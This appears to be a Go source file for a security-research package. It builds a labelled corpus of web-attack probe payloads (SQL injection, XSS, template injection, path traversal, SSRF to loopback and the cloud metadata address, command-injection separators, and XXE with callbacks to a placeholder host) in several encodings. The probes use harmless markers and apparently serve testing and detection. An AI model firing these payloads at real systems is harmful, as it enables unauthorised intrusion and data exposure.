// Package research owns reproducible reference data and real analysis routines.
// Reference payloads are data. Execution requires a separate approved lab tool.
package research

import (
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"html"
	"net/url"
	"strconv"
)

type Payload struct {
	ID,Family,Category,Encoding,Value string
	RequiresDecoding bool
}

func Encode(value,format string)(string,error){
	switch format{
	case "raw":return value,nil
	case "url":return url.QueryEscape(value),nil
	case "double_url":return url.QueryEscape(url.QueryEscape(value)),nil
	case "hex":return hex.EncodeToString([]byte(value)),nil
	case "base64":return base64.StdEncoding.EncodeToString([]byte(value)),nil
	case "html":return html.EscapeString(value),nil
	case "unicode":quoted:=strconv.QuoteToASCII(value);return quoted[1:len(quoted)-1],nil
	default:return "",errors.New("encoding must be raw, url, double_url, hex, base64, html or unicode")
	}
}

// Corpus has 50 distinct base cases and 150 explicitly labeled encoding
// variants. These are 200 research cases, not 200 proven exploit techniques.
func Corpus()[]Payload{
	type seed struct{family,category,value string}
	seeds:=[]seed{
		{"sqli","union","' UNION SELECT NULL--"},{"sqli","union","' UNION SELECT NULL,NULL,NULL--"},
		{"sqli","boolean","' AND '1'='1"},{"sqli","boolean","' AND '1'='2"},
		{"sqli","time_mysql","1 AND SLEEP(1)"},{"sqli","time_postgres","1; SELECT pg_sleep(1)--"},
		{"sqli","error_postgres","' AND CAST('ROGUE' AS INTEGER)=1--"},{"sqli","error_mysql","' AND EXTRACTVALUE(1,CONCAT(':','ROGUE'))--"},
		{"sqli","stacked","1; SELECT 1--"},{"sqli","stacked","1; SELECT 'ROGUE'--"},
		{"xss","html","<script>console.log('ROGUE')</script>"},{"xss","html","<img src=x onerror=console.log('ROGUE')>"},
		{"xss","attribute","\" autofocus onfocus=console.log('ROGUE') x=\""},{"xss","attribute","' onmouseover=console.log('ROGUE') x='"},
		{"xss","javascript","';console.log('ROGUE');//"},{"xss","javascript","\";console.log('ROGUE');//"},
		{"xss","svg","<svg onload=console.log('ROGUE')>"},{"xss","url","javascript:console.log('ROGUE')"},
		{"xss","polyglot","\"><svg/onload=console.log('ROGUE')>"},{"xss","template","${console.log('ROGUE')}"},
		{"ssti","jinja","{{7*7}}"},{"ssti","twig","{{7*'7'}}"},{"ssti","freemarker","${7*7}"},
		{"ssti","erb","<%=7*7%>"},{"ssti","velocity","#set($x=7*7)$x"},{"ssti","generic","#{7*7}"},
		{"file_inclusion","unix","../../../../etc/hostname"},{"file_inclusion","unix","../../../../etc/os-release"},
		{"file_inclusion","unix","../../../../proc/version"},{"file_inclusion","windows","..\\..\\Windows\\win.ini"},
		{"file_inclusion","php_wrapper","php://filter/convert.base64-encode/resource=index.php"},{"file_inclusion","remote","https://example.invalid/rogue-marker.txt"},
		{"ssrf","loopback","http://127.0.0.1/"},{"ssrf","loopback_ipv6","http://[::1]/"},
		{"ssrf","decimal_ipv4","http://2130706433/"},{"ssrf","short_ipv4","http://127.1/"},
		{"ssrf","metadata_reference","http://169.254.169.254/"},{"ssrf","controlled_callback","https://example.invalid/rogue-ssrf"},
		{"command","unix_separator",";printf ROGUE"},{"command","unix_and","&&printf ROGUE"},
		{"command","unix_pipe","|printf ROGUE"},{"command","unix_substitution","$(printf ROGUE)"},
		{"command","unix_backtick","`printf ROGUE`"},{"command","windows_separator","&echo ROGUE"},
		{"xxe","file_hostname","<!DOCTYPE r [<!ENTITY p SYSTEM 'file:///etc/hostname'>]><r>&p;</r>"},
		{"xxe","file_os_release","<!DOCTYPE r [<!ENTITY p SYSTEM 'file:///etc/os-release'>]><r>&p;</r>"},
		{"xxe","callback","<!DOCTYPE r [<!ENTITY p SYSTEM 'https://example.invalid/rogue-xxe'>]><r>&p;</r>"},
		{"xxe","parameter_entity","<!DOCTYPE r [<!ENTITY % p SYSTEM 'https://example.invalid/rogue.dtd'>%p;]><r/>"},
		{"xxe","xinclude","<r xmlns:xi='http://www.w3.org/2001/XInclude'><xi:include parse='text' href='file:///etc/hostname'/></r>"},
		{"xxe","literal_control","<!DOCTYPE r [<!ENTITY p 'ROGUE_CONTROL'>]><r>&p;</r>"},
	}
	items:=make([]Payload,0,len(seeds)*4)
	for index,seed:=range seeds{for _,format:=range []string{"raw","url","double_url","hex"}{value,_:=Encode(seed.value,format);items=append(items,Payload{ID:fmt.Sprintf("%s-%03d-%s",seed.family,index+1,format),Family:seed.family,Category:seed.category,Encoding:format,Value:value,RequiresDecoding:format!="raw"})}}
	return items
}
